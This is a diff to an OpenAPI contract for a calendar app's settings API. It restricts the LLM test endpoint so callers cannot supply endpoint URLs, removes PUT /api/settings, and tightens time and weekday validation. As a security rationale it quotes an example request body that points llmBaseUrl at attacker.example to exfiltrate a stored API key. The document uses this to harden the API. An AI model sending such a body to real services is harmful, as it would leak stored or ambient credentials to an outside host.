@@ -417,24 +417,67 @@ paths:
         Probes a provider configuration by issuing a fixed completion
         (system "You are a helpful assistant.", user "Say hello").
 
-        PAC-24 resolves API-037. The body is OPTIONAL and describes the
-        configuration to probe. When a body is supplied the probe uses it,
-        including an `llmApiKey` that has not been saved — which is the only way
-        to verify a key before storing it, now that a stored key can never be
-        read back (see `SettingsFields.llmApiKey`). When the body is absent or
-        empty (`{}`) the probe falls back to the CALLER'S OWN stored settings,
-        which is the pre-PAC-24 behaviour and keeps the operation usable by a
-        client with nothing to offer.
+        PAC-24 resolves API-037. **THE DESTINATION IS NEVER SUPPLIED BY THE
+        CALLER.** Every value that contributes to the URL this server requests —
+        `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`, `azureDeployment`,
+        `azureApiVersion`, `awsRegion`, `awsProfile`, `bedrockModel`,
+        `gcpProject`, `gcpLocation`, `vertexModel` — is read from the CALLER'S
+        OWN stored settings and from nowhere else. The request body may carry
+        only `llmProvider`, `llmModel` and `llmApiKey`, none of which reaches a
+        URL (`backend/nlp/llm_factory.go:13-58`: `llmModel` is consulted only by
+        the `openai` and `anthropic` branches, where it is a JSON body field, and
+        `llmApiKey` only as an `Authorization` header value).
+
+        This is a security property of the contract, not a convenience, and the
+        invariant is: **a credential the caller did not supply is never sent to a
+        destination the caller did supply — because the caller cannot supply a
+        destination at all.** An earlier draft of this contract let a body
+        override each endpoint property individually with per-property fallback
+        to the stored values. That let
+        `{"llmProvider":"openai","llmBaseUrl":"https://attacker.example"}` pair a
+        caller-chosen host with the stored key:
+        `nlp.NewLLMClientFromSettings` builds
+        `OpenAIClient{APIKey: s.LLMAPIKey, BaseURL: s.LLMBaseURL}`
+        (`backend/nlp/llm_factory.go:29`) and `OpenAIClient.Complete` POSTs to
+        `base + "/v1/chat/completions"` with `Authorization: Bearer <key>`
+        (`backend/nlp/parser.go:31,43`), so the stored key would leave the
+        deployment and the 200/502 would confirm delivery. An all-or-nothing
+        body (supply the endpoint AND the key together) does not close it either:
+        on the `azure_openai`, `bedrock` and `vertex` branches the credential is
+        AMBIENT and cannot be submitted —
+        `AzureOpenAIClient.Complete` mints a token with
+        `azidentity.NewDefaultAzureCredential` and sends it as
+        `Authorization: Bearer <token>` to `c.Endpoint`
+        (`backend/nlp/llm_azure_openai.go:28-50`) — so any submitted endpoint is
+        necessarily paired with a credential the caller did not supply. Refusing
+        submitted destinations outright is the only shape that holds for all six
+        providers.
+
+        What the body IS for: verifying a key that has not been saved, now that a
+        stored key can never be read back (see `SettingsFields.llmApiKey`), and
+        naming which provider the result is about (spec AC-15). An absent body,
+        or `{}`, probes the caller's stored configuration entirely — the
+        pre-PAC-24 behaviour.
 
         Before PAC-24 the handler never read r.Body at all and always probed the
         SINGLETON settings row, so this operation reported on the deployment's
-        saved configuration rather than on the caller's or on what was submitted
-        (API-002, API-037).
+        saved configuration rather than on the caller's (API-002, API-037).
 
         No response on any status carries the submitted or the stored
         `llmApiKey`. The provider's own error text is still echoed on 502 — that
         is API-054 / T8 and is NOT resolved here; the narrower guarantee PAC-24
         adds is that the key itself never appears (spec AC-14).
+
+        NOT resolved here, and recorded rather than silently fixed (factory §7):
+        a caller can still steer this probe indirectly by first writing
+        `llmBaseUrl` or `azureEndpoint` into their OWN settings via
+        `PATCH /api/settings` and then probing. That path exists today via
+        the pre-PAC-24 `PUT /api/settings` plus this operation, PAC-24 neither opens
+        nor closes it (the write is now `PATCH`), and on
+        the ambient-credential providers it reaches a deployment-wide cloud
+        identity rather than the caller's own key. It needs its own issue
+        (allow-listing or scheme/host restriction on the endpoint properties);
+        see `contracts/features/PAC-24.md` §2.
       requestBody:
         required: false
         content:
@@ -450,8 +493,16 @@ paths:
                 $ref: '#/components/schemas/LLMTestResult'
         '400':
           description: >
-            Malformed JSON body, or a body naming an `llmProvider` outside the
-            permitted set. JSON error shape (writeError).
+            Malformed JSON body; a body naming an `llmProvider` outside the
+            permitted set; or a body carrying any property other than
+            `llmProvider`, `llmModel` and `llmApiKey`
+            (`additionalProperties: false`). The last case is how a caller
+            attempting to supply a destination - `llmBaseUrl`, `azureEndpoint`,
+            `ollamaBaseUrl`, … - is refused, and it must be refused here rather
+            than ignored, so that a client is told its override did nothing
+            instead of being left to believe it probed what it named.
+            JSON error shape (writeError). The response never contains the
+            submitted or the stored `llmApiKey` (spec AC-14).
           content:
             application/json:
               schema:
@@ -519,7 +570,9 @@ paths:
       summary: Change some of the caller's settings
       description: >
         MERGE, at the top level, against the CALLER'S OWN settings. This is the
-        write operation for settings; `PUT` is a deprecated alias (below).
+        ONLY write operation for settings: PAC-24 removes `PUT /api/settings`
+        rather than retaining it as a deprecated alias, for the reasons in the
+        comment on this path and in `contracts/features/PAC-24.md` §3.
 
         The rule is total and needs no knowledge of what is stored:
 
@@ -565,53 +618,27 @@ paths:
             text/plain:
               schema:
                 type: string
-    put:
-      operationId: updateSettings
-      tags: [settings]
-      deprecated: true
-      summary: Deprecated alias for PATCH /api/settings
-      description: >
-        DEPRECATED. Identical in every respect to `PATCH /api/settings`: same
-        body schema, same merge semantics, same responses. It exists only so
-        that a frontend deployed before this contract merged keeps saving
-        settings during the window the factory's fixed cross-repo ordering
-        creates (backend merges, types regenerate, frontend implements).
-
-        It is retained knowing that a PUT which merges contradicts the method's
-        definition. The alternative - keeping PUT as a true replace - is not
-        available: `llmApiKey` is `writeOnly`, so a client can never hold a
-        complete representation of this resource and therefore can never make a
-        well-formed PUT. See `contracts/features/PAC-24.md` §3.
-
-        Removed by the follow-up issue named in `contracts/features/PAC-24.yaml`
-        (`followUps.retirePutSettings`) once the frontend uses PATCH. New
-        consumers MUST use PATCH.
-
-        Before PAC-24 this was a full replace against a shared row: every
-        omitted field was persisted as its Go zero value, so a partial write
-        wiped the stored key, timezone, focus configuration and recap
-        configuration for every user at once (API-002, API-004).
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              $ref: '#/components/schemas/SettingsUpdate'
-      responses:
-        '200':
-          description: The re-read settings document for the caller.
-          content:
-            application/json:
-              schema:
-                $ref: '#/components/schemas/Settings'
-        '400':
-          $ref: '#/components/responses/SettingsValidationError'
-        '500':
-          description: Save or re-read failure, text/plain (http.Error).
-          content:
-            text/plain:
-              schema:
-                type: string
+    # PUT /api/settings is REMOVED by PAC-24. Revision 1 of this contract
+    # retained it as a deprecated merge-semantics alias, on the argument that it
+    # shielded the pre-PAC-24 frontend during the factory's cross-repo window
+    # (README §1). That argument does not survive checking:
+    #   * The only PUT consumer is
+    #     `smart-calendar-flow/src/api/client.ts:813`, which sends
+    #     `settingsRequestBody(s)` - a spread of the snake_case `Settings` object
+    #     (`:550-563`), so the body carries `work_start`, `llm_api_key` and 24
+    #     more snake_case names. PUT and PATCH shared `SettingsUpdate`, which is
+    #     `additionalProperties: false`, so that body was a 400 on PUT exactly as
+    #     on PATCH. The alias covered nothing.
+    #   * `mcp/client.go` defines get/post/patch/delete and no PUT at all
+    #     (`:22,43,47,52`), and no MCP tool writes settings - `clockwise_get_settings`
+    #     (`mcp/tools.go:236`) is a GET. The MCP server is not a consumer.
+    #   * `e2e/tests/` contains no settings spec.
+    # A PUT whose omissions mean "unchanged" is not a replace, and `deprecated`
+    # documents an intention to remove, not a change of method semantics -
+    # generated clients and any intermediary reasoning about idempotency read the
+    # method. The old frontend's writes are silently discarded by the server
+    # today (API-013), so a 400 from the removed route is strictly more honest
+    # than a silent success. See `contracts/features/PAC-24.md` §3.
 
   /api/settings/daily-recap:
     get:
@@ -798,6 +825,35 @@ components:
         `calendarProvider must be one of: google, outlook, webcal` (resolves
         U-18);
         `conferencingProvider must be one of: meet, zoom, teams`.
+
+        Messages revision 2 of this contract adds, each with its reason:
+        `recapSendTime must be in HH:MM format` now also covers `""`. The write
+        path previously substituted `08:00` for an empty value
+        (`recapSendTimeOrDefault`, `backend/storage/settings.go:356-361`); under
+        the merge rule a present property must be stored exactly as given, so a
+        silent substitution is a contract violation and the empty value is
+        refused instead. See `SettingsFields.recapSendTime`; this is the one
+        clock property for which `""` is NOT a value, and it needs a narrow
+        amendment to spec AC-7.
+        `workingHours.days must contain at least one weekday when mode is by_day`
+        - a `by_day` document with an empty `days` map is the only remaining
+        stored state that makes the consumer delete the working-hours section
+        with no error (`smart-calendar-flow/src/api/client.ts:505-517,543`); the
+        `all_days` equivalent is already normalised away on read
+        (`backend/storage/settings.go:95-99`). Serves spec AC-20.
+
+        Two messages in the list above become UNREACHABLE via the HTTP boundary
+        and remain only as defence in depth, because `propertyNames` now rejects
+        the request at schema validation:
+        `workingHours.days.<day> is not a valid weekday` and
+        `lunchBreaks.<day> is not a valid weekday`. The handler checks stay -
+        they are what `handlers_settings_schedule_test.go:41-49` asserts, and
+        spec §6 requires that test to keep passing unchanged.
+
+        `""` is NOT in this catalogue for `workStart`, `workEnd`, `lunchStart`
+        or `lunchEnd`. It is a valid value for all four, on read and on write
+        (spec AC-7); the handler already skips the format check for it
+        (`backend/api/handlers_settings.go:75`).
       content:
         application/json:
           schema:
@@ -1318,22 +1374,30 @@ components:
     LLMTestRequest:
       type: object
       description: >
-        Optional body for POST /api/llm/test: the provider configuration to
-        probe. Added by PAC-24 to close API-037.
+        Optional body for POST /api/llm/test. Added by PAC-24 to close API-037.
 
-        Every property is optional and a missing one falls back to the CALLER'S
-        stored value, so `{"llmApiKey": "sk-..."}` probes a new key against the
-        stored provider and model - which is the case the settings UI needs,
-        because a stored key can no longer be read back to re-submit.
-        An absent body, or `{}`, probes the stored settings entirely - the
-        pre-PAC-24 behaviour.
+        **This schema is a closed list of three properties and that is the whole
+        point of it.** Not one of them can contribute to the URL the server
+        requests, so no submitted value can direct a stored or ambient credential
+        anywhere. The endpoint properties a probe might plausibly want to
+        override - `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`,
+        `azureDeployment`, `azureApiVersion`, `awsRegion`, `awsProfile`,
+        `bedrockModel`, `gcpProject`, `gcpLocation`, `vertexModel` - are
+        DELIBERATELY ABSENT and are a 400 via `additionalProperties: false`. The
+        operation description carries the full argument, including why an
+        all-or-nothing body (endpoint plus credential together) does not close
+        the channel on the three ambient-credential providers.
 
-        This is deliberately NOT `SettingsUpdate`. Sharing that schema would let
-        a probe carry the working day, the recap configuration and the calendar
-        provider, none of which a probe can use, and would make it read like a
-        write. The property names are the same as the corresponding
-        SettingsFields ones so a client can build this from the document it
-        already holds.
+        An absent body, or `{}`, probes the caller's stored configuration - the
+        pre-PAC-24 behaviour. `{"llmApiKey": "sk-..."}` probes an unsaved key
+        against the caller's stored endpoint, which is the case the settings UI
+        needs because a stored key can no longer be read back to re-submit.
+
+        This is deliberately NOT `SettingsUpdate`. Sharing that schema would
+        re-admit every endpoint property by inheritance, which is precisely the
+        defect this shape exists to prevent, and would make a probe read like a
+        write. The three property names match the corresponding SettingsFields
+        ones so a client can build this from the document it already holds.
 
         `llmApiKey` here is `writeOnly` for the same reason it is on
         SettingsFields: it is accepted and is never echoed, including in the 400
@@ -1342,35 +1406,28 @@ components:
         llmProvider:
           type: string
           enum: ['', openai, anthropic, ollama, bedrock, azure_openai, vertex]
+          description: >
+            Which provider branch of `nlp.NewLLMClientFromSettings` to probe.
+            Selects the client; it does not select a host. On `openai` and
+            `anthropic` the host is the caller's stored `llmBaseUrl` (or the
+            vendor default when that is empty); on the other four it is built
+            entirely from the caller's stored endpoint properties. Spec AC-15.
         llmModel:
           type: string
+          description: >
+            Consulted only by the `openai` and `anthropic` branches
+            (`backend/nlp/llm_factory.go:25,34`), where it is a field of the JSON
+            request body. It never appears in a URL. `bedrockModel`,
+            `azureDeployment` and `vertexModel` - which DO appear in URLs - are
+            not accepted here.
         llmApiKey:
           type: string
           writeOnly: true
-        llmBaseUrl:
-          type: string
-        awsRegion:
-          type: string
-        awsProfile:
-          type: string
-        bedrockModel:
-          type: string
-        azureEndpoint:
-          type: string
-        azureDeployment:
-          type: string
-        azureApiVersion:
-          type: string
-        gcpProject:
-          type: string
-        gcpLocation:
-          type: string
-        vertexModel:
-          type: string
-        ollamaBaseUrl:
-          type: string
-        ollamaModel:
-          type: string
+          description: >
+            An unsaved key to probe. Used only as the `Authorization` header
+            value sent to the caller's stored endpoint
+            (`backend/nlp/parser.go:43`). Ignored by the four branches that take
+            no key. Never persisted and never echoed (spec AC-14).
       additionalProperties: false
 
     LLMTestResult:
@@ -1421,18 +1478,64 @@ components:
     WorkingHoursSchedule:
       type: object
       description: >
-        storage.WorkingHoursSchedule. Normalised on read: an empty `mode` is
-        rewritten to `{mode: all_days, default: {enabled: true, start: workStart
-        or 09:00, end: workEnd or 18:00}, days: {}}`, and a nil `days` map
-        becomes `{}`. So GET never returns an empty mode.
+        storage.WorkingHoursSchedule. Replaced WHOLE by a PATCH that mentions it;
+        there is no deep merge (spec AC-9).
+
+        **Normalised on read** by `Settings.normalizeSchedules`
+        (`backend/storage/settings.go:92-106`), which `loadScheduleFields` calls
+        on every read path (`:495`): an empty `mode` becomes
+        `{mode: all_days, default: {enabled: true, start: workStart or 09:00,
+        end: workEnd or 18:00}, days: {}}`; an `all_days` document whose
+        `default` is entirely empty (`enabled:false, start:"", end:""`) has that
+        default replaced the same way (`:95-99`); and a nil `days` map becomes
+        `{}`.
+
+        **So `{"mode":"all_days","default":{"enabled":false,"start":"","end":""},
+        "days":{}}` is NOT a document GET can return** - the `:95-99` branch
+        rewrites it before it reaches the wire. That matters because it is the
+        one document the shipped consumer cannot render: `normalizeInterval`
+        rejects an empty `start`/`end` and returns `undefined`
+        (`smart-calendar-flow/src/api/client.ts:477-488`), `normalizeWorkingHours`
+        then returns `undefined` because `default` is undefined and `days` is
+        empty (`:505-517`), and `normalizeSettings` reaches
+        `delete out.working_hours` (`:543`) - the per-day section disappears with
+        no error and no empty state, which is the silent blank spec AC-20 exists
+        to end.
+
+        The `by_day` arm of the same shape IS reachable, because `:95-99` guards
+        on `mode == "all_days"`: `{"mode":"by_day", …, "days":{}}` normalises to
+        itself and produces the identical `undefined` in the consumer. PAC-24
+        closes it at the point of entry rather than describing it - a `by_day`
+        document must carry at least one weekday (400:
+        `workingHours.days must contain at least one weekday when mode is
+        by_day`). `by_day` with no days also means "this user never works",
+        which no consumer intends and which `WorkWindow` already renders as
+        `enabled:false` for every day (`:117-121`).
       properties:
         mode:
           type: string
-          enum: [all_days, by_day]
+          enum: ['', all_days, by_day]
           description: >
-            Compared case-insensitively after trimming during validation, but
-            the persisted/returned value is whatever was sent. `""` is accepted
-            on write only when `days` is empty.
+            Compared case-insensitively after trimming during validation
+            (`backend/api/handlers_settings.go:128`), but the persisted value is
+            whatever was sent.
+
+            `''` is in the enum because the server accepts it
+            (`:129`, `mode != "" && mode != "all_days" && mode != "by_day"`) and
+            because the contract must describe what is, not what should be
+            (factory §7). Revision 1 of this contract omitted `''` while the
+            description two lines below said it was accepted - a schema
+            disagreeing with its own prose. It is accepted on write ONLY when
+            `days` is empty; otherwise it is the existing 400
+            `workingHours.mode is required when day-specific hours are provided`
+            (`:132-134`). That conditional is cross-property and OpenAPI cannot
+            express it, so it stays a documented 400 rather than becoming a
+            schema narrowing - narrowing here would be a NEW rejection, and spec
+            §6 requires both tests in
+            `backend/api/handlers_settings_schedule_test.go` to keep passing
+            unchanged.
+
+            A GET never returns `''`, because normalisation rewrites it.
         default:
           $ref: '#/components/schemas/DaySchedule'
           description: >
@@ -1441,11 +1544,21 @@ components:
         days:
           type: object
           description: >
-            Keys must be lowercase English weekday names
-            (monday..sunday); the validator lowercases before checking, but
-            WorkWindow() looks up `strings.ToLower(day.Weekday().String())`, so
-            a non-lowercase key that passed validation will never match at read
-            time. In `by_day` mode a missing weekday means "not working".
+            Keys are lowercase English weekday names, and PAC-24 makes that a
+            schema constraint rather than a warning. `validateSchedulePreferences`
+            lowercases before checking
+            (`backend/api/handlers_settings.go:145`,
+            `validScheduleWeekdays[strings.ToLower(day)]`), so `"Monday"` passes
+            validation and is stored - but `WorkWindow` looks the day up as
+            `strings.ToLower(day.Weekday().String())`
+            (`backend/storage/settings.go:117`), so the entry can never match and
+            the user's Monday hours are silently inert forever. Under the
+            whole-object replace this is worse than it was: the write that
+            installs the dead key also deletes the live key it replaced.
+            `propertyNames` makes the dead key a 400 instead of a document that
+            says so. In `by_day` mode a missing weekday means "not working".
+          propertyNames:
+            enum: [monday, tuesday, wednesday, thursday, friday, saturday, sunday]
           additionalProperties:
             $ref: '#/components/schemas/DaySchedule'
       required: [mode, default, days]
@@ -1455,9 +1568,19 @@ components:
       type: object
       description: >
         storage.LunchBreakSchedule - a bare map keyed by lowercase weekday name.
-        Normalised to `{}` (never null) on read. A per-day entry overrides the
+        Normalised to `{}` (never null) on read
+        (`backend/storage/settings.go:103-105`). A per-day entry overrides the
         legacy global `lunchStart`/`lunchEnd`/`protectLunch` trio, including
-        disabling lunch for that day.
+        disabling lunch for that day. Replaced whole by a PATCH that mentions it;
+        `lunchBreaks: {}` clears every per-day override (spec AC-9).
+
+        `propertyNames` is added by PAC-24 for the same reason as on
+        `WorkingHoursSchedule.days`: the validator lowercases the key before
+        checking (`backend/api/handlers_settings.go:154`) but `LunchWindow` looks
+        it up already-lowercased (`backend/storage/settings.go:138`), so a
+        `"Monday"` key validates, stores, and never matches.
+      propertyNames:
+        enum: [monday, tuesday, wednesday, thursday, friday, saturday, sunday]
       additionalProperties:
         $ref: '#/components/schemas/DaySchedule'
 
@@ -1465,7 +1588,7 @@ components:
       type: object
       description: >
         The property set shared by the GET response (`Settings`) and the PATCH /
-        deprecated-PUT body (`SettingsUpdate`). Property names come straight from
+        PATCH body (`SettingsUpdate`). Property names come straight from
         the json tags on storage.Settings - camelCase throughout. `ID`,
         `MicrosoftTokens` and `ZoomTokens` are `json:"-"` and never appear on the
         wire.
@@ -1482,20 +1605,45 @@ components:
       properties:
         workStart:
           type: string
-          pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
           description: >
-            `HH:MM`. DB default `09:00`. PAC-24 tightened the pattern from
-            `^[0-9]{2}:[0-9]{2}$`, which admitted `99:99`; the server's own check
-            on this property was the same loose regexp, so `99:99` was stored.
+            `HH:MM`, OR THE EMPTY STRING. DB default `09:00`. PAC-24 tightened
+            the shape from `^[0-9]{2}:[0-9]{2}$`, which admitted `99:99` (the
+            server's own check was the same loose regexp, so `99:99` was
+            stored), and at the same time widened it to admit `""`, which the
+            server both accepts and returns.
+
+            `""` is not a modelling slip, it is the state the data is in.
+            `validateSettings` skips the format check exactly when the value is
+            empty (`backend/api/handlers_settings.go:75`,
+            `if val != "" && !timePattern.MatchString(val)`), and every row
+            zeroed by API-004 - the defect this feature exists to repair -
+            already holds `""` in this column, because the pre-PAC-24 full
+            replace persisted each omitted property as its Go zero value. A
+            strict `HH:MM` pattern would make day-one GETs fail the contract they
+            were generated from, and the generated zod schema would reject the
+            body before any UI saw it. It is also what makes spec AC-7
+            satisfiable: `{"workStart": ""}` is the documented way to clear this
+            setting, and under the merge rule a present property is stored
+            exactly as given.
+
+            Consumers already treat `""` as meaningful rather than as damage:
+            `WorkWindow` falls back to `09:00`/`18:00` when the effective start
+            or end is empty (`backend/storage/settings.go:124-127`).
+            The same widening, for the same reason, was already applied to
+            `DaySchedule.start`/`end`. Contrast `recapSendTime`, which is
+            NOT widened - see its own description.
         workEnd:
           type: string
-          pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
           description: >
-            DB default `18:00`. PAC-24 adds the cross-property check that
-            workEnd > workStart, which OpenAPI cannot express; it is a 400
-            (`workEnd must be after workStart`). Before PAC-24 an inverted
-            working day was accepted and produced a zero-length day at use
-            (API-082).
+            `HH:MM` or `""`, as `workStart`. DB default `18:00`. PAC-24 adds the
+            cross-property check that workEnd > workStart, which OpenAPI cannot
+            express; it is a 400 (`workEnd must be after workStart`). That check
+            applies only when BOTH values are non-empty, which is the existing
+            handler behaviour and keeps `""` a clear rather than a 400. Before
+            PAC-24 an inverted working day was accepted and produced a
+            zero-length day at use (API-082).
         timezone:
           type: string
           description: >
@@ -1536,14 +1684,22 @@ components:
           description: 'Hex colour string. Not validated. DB default `#4F46E5`.'
         lunchStart:
           type: string
-          pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
-          description: 'DB default `12:00`. Legacy global; overridden per-day by lunchBreaks.'
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
+          description: >
+            `HH:MM` or `""`. DB default `12:00`. Legacy global; overridden
+            per-day by lunchBreaks. `""` here is the strongest case of the four:
+            it is not merely tolerated but LOAD-BEARING. `LunchWindow` returns
+            `enabled: false` precisely when `lunchStart` or `lunchEnd` is empty
+            (`backend/storage/settings.go:141-142`), so `""` is how "this user
+            has no protected lunch" is represented. Forbidding it in the schema
+            would make an existing, meaningful state unrepresentable.
         lunchEnd:
           type: string
-          pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
+          pattern: '^(([01][0-9]|2[0-3]):[0-5][0-9])?$'
           description: >
-            DB default `13:00`. PAC-24 adds the cross-property check
-            lunchEnd > lunchStart as a 400 (API-082).
+            `HH:MM` or `""`, as `lunchStart`. DB default `13:00`. PAC-24 adds the
+            cross-property check lunchEnd > lunchStart as a 400 (API-082),
+            applied only when both values are non-empty.
         protectLunch:
           type: boolean
           description: 'DB default true.'
@@ -1689,8 +1845,39 @@ components:
           type: string
           pattern: '^([01][0-9]|2[0-3]):[0-5][0-9]$'
           description: >
-            `HH:MM`, in the same form on read and on write. Empty on write ->
-            `08:00` is substituted.
+            `HH:MM`, in the same form on read and on write. **STRICT: unlike the
+            four legacy clock properties above, `""` is NOT admitted here, in
+            either direction.** The three reasons are specific to this column and
+            do not generalise:
+
+            (a) There is no empty state to represent. The column is
+            `TIME NOT NULL DEFAULT '08:00'` (`015_daily_recap.up.sql:3`), and the
+            write path passes every value through
+            `recapSendTimeOrDefault` (`backend/storage/settings.go:356-361`),
+            which turns `""` into `08:00`. So no row can hold an empty send time
+            and no GET can return one - the `COALESCE(...,'')` at `:224` and
+            `:439` is defensive and unreachable. This is the difference from
+            `workStart`/`lunchStart`, where `""` both exists in the data and
+            carries meaning.
+
+            (b) Admitting `""` would make this contract lie about its own merge
+            rule. `PATCH /api/settings` states that a property present is set to
+            exactly the value given; `""` here would instead be silently
+            rewritten to `08:00`. A client asking to clear a value and being told
+            `200` while the server stored something it did not ask for is the
+            exact silent-success failure mode this contract refuses for `null`.
+
+            (c) PAC-24 therefore removes the substitution: `""` is a 400
+            (`recapSendTime must be in HH:MM format`), which is the same message
+            spec AC-17 already requires for a malformed value and which AC-16
+            requires instead of an internal failure.
+
+            **This requires a narrow amendment to spec AC-7**, which as written
+            says an empty value of a setting's type always clears it. AC-7 must
+            exempt `recapSendTime` on the ground that it has no empty state. The
+            contract author may not edit the spec; the amendment is named in
+            `contracts/features/PAC-24.md` §"Revision 2" and must be made before
+            stage 3.
 
             Resolves U-19, and resolves it by CHANGING the server rather than by
             documenting what it did. The column is Postgres `TIME`
@@ -1736,8 +1923,8 @@ components:
 
     Settings:
       description: >
-        The settings document for ONE user, returned by GET, PATCH and the
-        deprecated PUT. Every property is always present except `llmApiKey`,
+        The settings document for ONE user, returned by GET and by PATCH.
+        Every property is always present except `llmApiKey`,
         which is `writeOnly` and therefore never present (spec AC-11);
         `llmApiKeySet` takes its place in the required list.
       allOf:
@@ -1796,7 +1983,7 @@ components:
 
     SettingsUpdate:
       description: >
-        PATCH /api/settings body (and the deprecated PUT's). Nothing is required:
+        PATCH /api/settings body - the only settings write. Nothing is required:
         a property absent means "leave it as it is", and `{}` is a valid no-op
         request. A property present is applied exactly as given - `""`, `0` and
         `false` are values, not absences.
@@ -1811,8 +1998,12 @@ components:
         deep-merged (spec AC-9). `llmApiKeySet` and `updatedAt` are `readOnly`
         and are accepted and ignored.
 
-        Before PAC-24 this was a replace: every omitted property was persisted as
-        its Go zero value (API-004).
+        Before PAC-24 this was the body of `PUT /api/settings`, a replace: every
+        omitted property was persisted as its Go zero value (API-004). That
+        operation is removed, not deprecated - its only consumer
+        (`smart-calendar-flow/src/api/client.ts:813`) sends snake_case names that
+        `additionalProperties: false` refuses on either method, so a deprecated
+        alias would have shielded nothing.
       allOf:
         - $ref: '#/components/schemas/SettingsFields'
 
